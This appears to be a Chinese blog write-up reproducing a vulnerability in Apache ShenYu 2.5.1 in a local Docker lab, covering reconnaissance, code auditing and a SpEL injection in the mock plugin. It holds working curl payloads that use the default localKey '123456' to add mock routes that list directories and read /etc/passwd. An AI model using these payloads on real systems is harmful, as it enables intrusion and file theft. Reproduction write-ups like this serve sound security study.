---
abbrlink: ''
categories:
- - 漏洞复现
date: '2026-04-27T09:34:46.204202+08:00'
tags:
- apache-shenyu
title: title
updated: '2026-04-27T09:34:47.180+08:00'
---
## 环境搭建

* 系统环境：Ubuntu 24.04
* 利用条件：开启 mock 插件

1. docker 环境搭建

```docker
sudo docker network create shenyu-quickstart
sudo docker run -d --name shenyu-admin-quickstart \
           -p 9095:9095        \
           --network=shenyu-quickstart     \
           apache/shenyu-admin:2.5.1

sudo docker run -d --name shenyu-quickstart \
           -p 9195:9195        \
           -e "shenyu.local.enabled=true" \
           -e SHENYU_SYNC_WEBSOCKET_URLS=ws://shenyu-admin-quickstart:9095/websocket \
           --network=shenyu-quickstart     \
           apache/shenyu-bootstrap:2.5.1
```

2. 首先要进 shenhyu-amdin 的后台开个设置，默认账户：admin:123456

![image](https://img2.eval.moe/image-20260424114114-tsfydiq.png)

3. 开启 mock 插件，环境搭建完成

![image](https://img2.eval.moe/image-20260424114341-w4hm10w.png)

![image](https://img2.eval.moe/image-20260424114410-uik1hcs.png)

## 信息收集

1. 打开页面发现是 apache shenyu 框架

![image](https://img2.eval.moe/image-20260424114819-i4vc7db.png)

2. 去 github 搜这个框架，并且在 src/main/resources/application.yml 目录发现了开放的接口

![image](https://img2.eval.moe/image-20260424115113-zrg0y1j.png)

3. 先探测一下版本，访问了一下 /v3/api-docs 提示失败，考虑到版本较老，将 v3 改为 v2 访问成功，并且看到了框架版本信息

![image](https://img2.eval.moe/image-20260424115258-yr2afza.png)

## 默认 key 创建路由

在 ReadMe 里有个默认 key，可以用于创建路由

![image](https://img2.eval.moe/image-20260424115721-25octcz.png)

官方给出的示例如下

```
curl --location --request POST 'http://localhost:9195/shenyu/plugin/selectorAndRules' \--header 'Content-Type: application/json' \--header 'localKey: 123456' \--data-raw '{
"pluginName": "divide",
"selectorHandler": "[{\"upstreamUrl\":\"127.0.0.1:8080\"}]",
"conditionDataList": [{
"paramType": "uri",
"operator": "match",
"paramValue": "/**"
  }],
"ruleDataList": [{
"ruleHandler": "{\"loadBalance\":\"random\"}",
"conditionDataList": [{
"paramType": "uri",
"operator": "match",
"paramValue": "/**"
  }]
  }]
}'
```

![image](https://img2.eval.moe/image-20260424140932-x2dzd4b.png)

但是并没有什么用，我们现在的思路是找到一个有问题的插件，添加路由，然后在访问路由时触发 sink 点

## 代码审计

通过代码审计我们可以看到 shenyu-plugin-mock 插件有一处 SPEL 表达式注入，文件路径：C:\\Users\\aaa\\Documents\\environment\\shenyu-2.5.1\_2\\shenyu-2.5.1\\shenyu-plugin\\shenyu-plugin-mock\\src\\main\\java\\org\\apache\\shenyu\\plugin\\mock\\generator\\ExpressionGenerator.java，同时文档也有提到这个插件：[Mock 插件 | Apache ShenYu](https://shenyu.apache.org/zh/docs/2.5.1/plugin-center/mock/mock-plugin/#24--%E6%94%AF%E6%8C%81%E7%9A%84%E8%AF%AD%E6%B3%95)，但是我们并不知道传参，所以我们现在要去找传参

![image](https://img2.eval.moe/image-20260424160051-fwaqxoz.png)

经过一番寻找，传参在 C:\\Users\\aaa\\Documents\\environment\\shenyu-2.5.1\_2\\shenyu-2.5.1\\shenyu-web\\src\\main\\java\\org\\apache\\shenyu\\web\\controller\\LocalPluginController.java

![image](https://img2.eval.moe/image-20260424160835-dpalkw1.png)

## SPEL 表达式注入利用

列目录

```
curl --location --request POST 'http://10.8.20.114:9195/shenyu/plugin/selectorAndRules' \
--header 'localKey: 123456' \
--header 'Content-Type: application/json' \
--header 'User-Agent: PostmanRuntime/7.51.0' \
--data-raw '{
  "pluginName": "mock",
  "selectorHandler": "[]",
  "conditionDataList": [
    {
      "paramType": "uri",
      "operator": "match",
      "paramValue": "/ls/**"
    }
  ],
  "ruleDataList": [
    {
      "ruleName": "list_dir",
      "ruleHandler": "{\"httpStatusCode\":200,\"responseContent\":\"{\\\"files\\\":\\\"${expression|T(org.springframework.util.StringUtils).arrayToCommaDelimitedString(new java.io.File(\\\".\\\").list())}\\\"}\"}",
      "conditionDataList": [
        {
          "paramType": "uri",
          "operator": "match",
          "paramValue": "/ls/**"
        }
      ]
    }
  ]
}'
```

![image](https://img2.eval.moe/image-20260424165914-o58ai6j.png)

读 passwd 文件

```
curl -X POST http://10.8.20.114:9195/shenyu/plugin/selectorAndRules \
-H 'Content-Type: application/json' \
-H 'localKey: 123456' \
--data-raw '{
    "pluginName": "mock",
    "selectorHandler": "[]",
    "conditionDataList": [
        {
            "paramType": "uri",
            "operator": "match",
            "paramValue": "/readfile2/**"
        }
    ],
    "ruleDataList": [
        {
            "ruleName": "read_test",
            "ruleHandler": "{\"httpStatusCode\":200,\"responseContent\":\"{\\\"file\\\":\\\"${expression|new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(\\\"/etc/passwd\\\")))}\\\"}\"}",
            "conditionDataList": [
                {
                    "paramType": "uri",
                    "operator": "match",
                    "paramValue": "/readfile2/**"
                }
            ]
        }
    ]
}'
```

![image](https://img2.eval.moe/image-20260424170431-dkqu6wu.png)
